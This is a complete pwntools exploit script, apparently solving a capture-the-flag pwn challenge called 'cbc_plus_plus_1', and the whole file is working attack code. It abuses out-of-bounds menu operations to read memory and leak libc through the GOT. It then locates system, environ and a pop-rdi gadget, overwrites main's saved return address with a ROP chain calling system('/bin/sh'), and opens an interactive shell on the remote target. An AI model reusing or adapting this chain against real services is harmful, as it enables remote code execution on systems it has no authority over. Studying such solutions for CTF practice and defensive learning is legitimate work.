#!/usr/bin/env python3
from argparse import ArgumentParser
from pathlib import Path

from pwn import *


context.clear(arch="amd64", os="linux")

ROOT = Path(__file__).resolve().parent
p = ArgumentParser()
p.add_argument("host", nargs="?")
p.add_argument("port", nargs="?", type=int)
p.add_argument("--ssl", action="store_true")
p.add_argument("--cmd", default="cat flag.txt")
p.add_argument("--debug", action="store_true")
p.add_argument("--scan-size", type=lambda x: int(x, 0), default=0x1800)
args = p.parse_args()
context.log_level = "debug" if args.debug else "info"

elf = ELF(str(ROOT / "cbc_plus_plus_1"), checksec=False)
io = remote(args.host, args.port, ssl=args.ssl, sni=args.host if args.ssl else None) if args.host else process([str(ROOT / "cbc_plus_plus_1")], cwd=str(ROOT))

name = elf.symbols["_Z4nameB5cxx11"]
fake = name + 8
ret = elf.symbols["_init"] + 0x1A
main = elf.symbols["main"]
leak_len = 15


def menu(n):
    io.recvuntil(b"Hi, ")
    data = io.recvn(n)
    io.recvuntil(b"> ")
    return data


def add(x, n=None):
    global leak_len
    io.sendline(b"1")
    io.recvuntil(b"Num: ")
    io.sendline(str(x & ((1 << 64) - 1)).encode())
    return menu(leak_len if n is None else n)


def sw(a, b, n=None):
    io.sendline(b"2")
    io.recvuntil(b"Index 1: ")
    io.sendline(str(a).encode())
    io.recvuntil(b"Index 2: ")
    io.sendline(str(b).encode())
    return menu(leak_len if n is None else n)


def seek(addr):
    add(addr - 8)


def leak(addr, n):
    global leak_len
    seek(name)
    add(addr)
    leak_len = n
    return add(n, n)


def libc_base(ptr):
    for addr in range(ptr & ~0xFFF, ptr - 0x600000, -0x1000):
        if leak(addr, 4) == b"\x7fELF":
            return addr
    raise RuntimeError("libc base not found")


def phdrs(base):
    eh = leak(base, 0x40)
    phoff, entsz, num = u64(eh[0x20:0x28]), u16(eh[0x36:0x38]), u16(eh[0x38:0x3A])
    raw = leak(base + phoff, entsz * num)
    return [
        (u32(p[:4]), u32(p[4:8]), u64(p[0x10:0x18]), u64(p[0x20:0x28]), u64(p[0x28:0x30]))
        for p in (raw[i * entsz : (i + 1) * entsz] for i in range(num))
    ]


def symbols(base, headers, want):
    dyn = next(h for h in headers if h[0] == 2)
    raw = leak(base + dyn[2], dyn[4])
    tags = {}
    for i in range(0, len(raw), 16):
        k, v = u64(raw[i : i + 8]), u64(raw[i + 8 : i + 16])
        if k == 0:
            break
        tags[k] = v

    ptr = lambda x: x if base <= x < base + 0x10000000 else base + x
    strtab, symtab, strsz, syment = ptr(tags[5]), ptr(tags[6]), tags[10], tags.get(11, 24)
    nchain = u32(leak(ptr(tags[4]), 8)[4:8])
    strings = leak(strtab, strsz)
    syms = leak(symtab, nchain * syment)
    out = {}

    for i in range(nchain):
        ent = syms[i * syment : (i + 1) * syment]
        off, val = u32(ent[:4]), u64(ent[8:16])
        end = strings.find(b"\x00", off)
        if off >= len(strings) or end < 0:
            continue
        s = strings[off:end].decode(errors="ignore")
        if s in want and s not in out:
            out[s] = base + val
    return out


def pop_rdi(base, headers):
    for _, flags, vaddr, size, _ in headers:
        if not flags & 1:
            continue
        prev = b""
        for off in range(0, size, 0x4000):
            chunk = leak(base + vaddr + off, min(0x4000, size - off))
            pos = (prev + chunk).find(b"\x5f\xc3")
            if pos >= 0:
                return base + vaddr + off - len(prev) + pos
            prev = chunk[-1:]
    raise RuntimeError("pop rdi; ret not found")


def ret_slot(stack_base, stack, libc_start):
    for off in range(0, len(stack) - 8, 8):
        q = u64(stack[off : off + 8])
        near_main = p64(main) in stack[off : off + 0x60]
        if libc_start - 0x200 <= q <= libc_start + 0x200 and near_main:
            return stack_base + off
    raise RuntimeError("main return slot not found")


io.recvuntil(b"Your name: ")
io.sendline(p64(name) + p64(fake)[:7])
menu(15)

add(name)
sw(0, -4)
sw(3, 4)
add(elf.got["__libc_start_main"], 15)
leak_len = 8
libc_start = u64(add(8, 8))
log.info("__libc_start_main = %#x", libc_start)

base = libc_base(libc_start)
headers = phdrs(base)
sym = symbols(base, headers, {"system", "environ", "exit"})
gadget = pop_rdi(base, headers)
log.info("libc base = %#x", base)

stack_top = u64(leak(sym["environ"], 8))
stack_base = stack_top - args.scan_size
stack = leak(stack_base, args.scan_size)
slot = ret_slot(stack_base, stack, libc_start)
chain = [ret, gadget, slot + 0x28, sym["system"], sym["exit"], u64(b"/bin/sh\x00")]
log.info("main saved RIP slot = %#x", slot)

leak(stack_base, 8)
seek(slot)
for x in chain:
    add(x)

io.sendline(b"3")
io.recvuntil(b"Bye!\n", timeout=2)
if args.cmd:
    io.sendline(args.cmd.encode())
io.interactive()
